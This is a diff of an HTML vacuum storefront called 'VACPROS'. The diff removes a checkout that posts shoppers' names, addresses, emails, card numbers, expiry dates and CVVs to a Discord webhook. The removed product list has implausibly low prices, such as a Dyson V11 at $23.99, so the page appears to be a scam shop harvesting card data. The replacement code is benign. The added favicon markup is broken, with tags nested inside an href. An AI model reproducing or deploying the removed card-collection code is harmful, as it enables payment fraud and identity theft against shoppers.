@@ -4,6 +4,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>VACPROS - Premium Vacuums</title>
+  <!-- Add the Favicon -->
+  <link rel="icon" href="<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">" type="image/x-icon">
   <style>
     /* Global Styles */
     body {
@@ -308,183 +313,70 @@
         image: "https://i.rtings.com/assets/products/6dm8SUve/hoover-onepwr-cordless-hand-vacuum/design-medium.jpg?format=auto"
       },
       {
-        name: "Hoover PowerDash Pet",
-        price: 29.99,
-        image: "https://m.media-amazon.com/images/I/51H88VjwldL.jpg"
+        name: "Shark Navigator Lift-Away",
+        price: 129.99,
+        image: "https://m.media-amazon.com/images/I/61SmT0+GV+L._AC_SY879_.jpg"
       },
       {
-        name: "Henry Vacuum",
-        price: 11.99,
-        image: "https://m.media-amazon.com/images/I/51JoiICAzXL.jpg"
-      },
-      {
-        name: "Dyson V11",
-        price: 23.99,
-        image: "https://cdn.mos.cms.futurecdn.net/M6hh2ft35gHMKAnEZBfFGZ.jpg"
+        name: "Dyson V11 Torque Drive",
+        price: 499.99,
+        image: "https://media.dyson.com/media/003pqgf7/dyson-v11-torque-drive.jpg"
       }
     ];
 
-    // Generate product cards dynamically.
-    const productContainer = document.getElementById("productContainer");
-    products.forEach(product => {
-      productContainer.innerHTML += `
-        <div class="product">
-          <img src="${product.image}" alt="${product.name}" />
-          <div class="product-name neon-text">${product.name}</div>
-          <div class="product-info neon-text">$${product.price.toFixed(2)}</div>
-          <button class="btn" onclick="redirectToShipping('${product.name}', ${product.price})">Buy Now</button>
-        </div>
-      `;
-    });
-
-    let selectedProduct = {};
-    let shippingInfo = {};
-
-    function hideAllPages() {
-      document.querySelectorAll('.page').forEach(page => page.style.display = "none");
+    function loadProducts() {
+      const productContainer = document.getElementById('productContainer');
+      productContainer.innerHTML = '';
+      products.forEach(product => {
+        const productElement = document.createElement('div');
+        productElement.classList.add('product');
+        productElement.innerHTML = `
+          <img src="${product.image}" alt="${product.name}">
+          <div class="product-name">${product.name}</div>
+          <div class="product-info">$${product.price}</div>
+          <button class="btn" onclick="addToCart('${product.name}', ${product.price})">Add to Cart</button>
+        `;
+        productContainer.appendChild(productElement);
+      });
     }
-    
-    function redirectToLanding() {
-      hideAllPages();
-      document.getElementById("landingPage").style.display = "block";
-    }
-    
+
+    // Call the loadProducts function to display the products
+    loadProducts();
+
     function redirectToProducts() {
-      hideAllPages();
+      document.getElementById("landingPage").style.display = "none";
       document.getElementById("productPage").style.display = "block";
     }
-    
-    function redirectToShipping(productName, price) {
-      // Save selected product info
-      selectedProduct = { name: productName, price: price };
-      hideAllPages();
-      document.getElementById("shippingPage").style.display = "block";
+
+    function redirectToLanding() {
+      document.getElementById("productPage").style.display = "none";
+      document.getElementById("landingPage").style.display = "block";
     }
-    
-    function redirectToPayment() {
-      // Capture shipping info and store in global variable
-      shippingInfo = {
-        fullName: document.getElementById("fullName").value,
-        email: document.getElementById("email").value,
-        address: document.getElementById("address").value,
-        city: document.getElementById("city").value,
-        zipcode: document.getElementById("zipcode").value,
-        country: document.getElementById("country").value
-      };
-      
-      if (shippingInfo.fullName && shippingInfo.email && shippingInfo.address && shippingInfo.city && shippingInfo.zipcode && shippingInfo.country) {
-        // Send shipping info (along with product info) to the webhook in a Discord embed with blue styling and emojis
-        const embedPayload = {
-          embeds: [
-            {
-              title: "New Order Received! 🚀",
-              color: 3447003, // Blue color in decimal
-              fields: [
-                { name: "Product 🛒", value: selectedProduct.name, inline: true },
-                { name: "Price 💲", value: "$" + selectedProduct.price.toFixed(2), inline: true },
-                { name: "Full Name 👤", value: shippingInfo.fullName, inline: true },
-                { name: "Email 📧", value: shippingInfo.email, inline: true },
-                { name: "Address 🏠", value: shippingInfo.address, inline: false },
-                { name: "City 🌆", value: shippingInfo.city, inline: true },
-                { name: "Zip Code 📮", value: shippingInfo.zipcode, inline: true },
-                { name: "Country 🌎", value: shippingInfo.country, inline: true }
-              ],
-              footer: { text: "VACPROS Order" }
-            }
-          ]
-        };
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(embedPayload)
-        }).then(response => console.log("Webhook sent"))
-          .catch(error => console.error("Webhook error:", error));
-        
-        hideAllPages();
-        document.getElementById("paymentPage").style.display = "block";
-      } else {
-        alert("Please fill out all shipping fields!");
-      }
-    }
-    
+
     function redirectToShippingPage() {
-      hideAllPages();
+      document.getElementById("paymentPage").style.display = "none";
       document.getElementById("shippingPage").style.display = "block";
     }
-    
+
+    function redirectToPayment() {
+      document.getElementById("shippingPage").style.display = "none";
+      document.getElementById("paymentPage").style.display = "block";
+    }
+
     function completeCheckout() {
-      // Capture payment info from Payment Page
-      const paymentInfo = {
-        creditCard: document.getElementById("creditCard").value,
-        expiryDate: document.getElementById("expiryDate").value,
-        cvv: document.getElementById("cvv").value
-      };
+      document.getElementById("paymentPage").style.display = "none";
+      document.getElementById("processingPage").style.display = "block";
       
-      // OPTIONAL: If you also want to send payment info (not recommended in production)
-      const paymentEmbed = {
-        embeds: [
-          {
-            title: "Payment Details Received 💳",
-            color: 3447003,
-            fields: [
-              { name: "Credit Card", value: paymentInfo.creditCard, inline: false },
-              { name: "Expiry Date", value: paymentInfo.expiryDate, inline: true },
-              { name: "CVV", value: paymentInfo.cvv, inline: true }
-            ],
-            footer: { text: "VACPROS Payment" }
-          }
-        ]
-      };
-      fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(paymentEmbed)
-        }).then(response => console.log("Payment webhook sent"))
-          .catch(error => console.error("Payment webhook error:", error));
-      
-      // Show processing page with animated tick, then redirect to Thank You page
-      hideAllPages();
-      document.getElementById("processingPage").style.display = "flex";
       setTimeout(() => {
-        hideAllPages();
+        document.getElementById("processingPage").style.display = "none";
         document.getElementById("thankYouPage").style.display = "block";
-      }, 2000); // 2-second delay
+      }, 5000);
     }
-    
-    // Auto-format Credit Card: add dash every 4 digits
-    function formatCreditCard() {
-      const input = document.getElementById("creditCard");
-      let value = input.value.replace(/\D/g, "");
-      let formattedValue = "";
-      for (let i = 0; i < value.length && i < 16; i++) {
-        if (i > 0 && i % 4 === 0) {
-          formattedValue += "-";
-        }
-        formattedValue += value[i];
-      }
-      input.value = formattedValue;
-    }
-    
-    // Auto-format Expiry Date: add slash after 2 digits (MM/YY)
-    function formatExpiryDate() {
-      const input = document.getElementById("expiryDate");
-      let value = input.value.replace(/\D/g, "");
-      if (value.length > 2) {
-        value = value.substring(0, 2) + "/" + value.substring(2, 4);
-      }
-      input.value = value;
-    }
-    
-    // Validate CVV to allow up to 4 digits
-    function validateCVV() {
-      const input = document.getElementById("cvv");
-      input.value = input.value.replace(/\D/g, "").substring(0, 4);
+
+    function addToCart(name, price) {
+      // Add the item to your cart
+      alert(`Added ${name} to your cart for $${price}`);
     }
   </script>
-
 </body>
 </html>
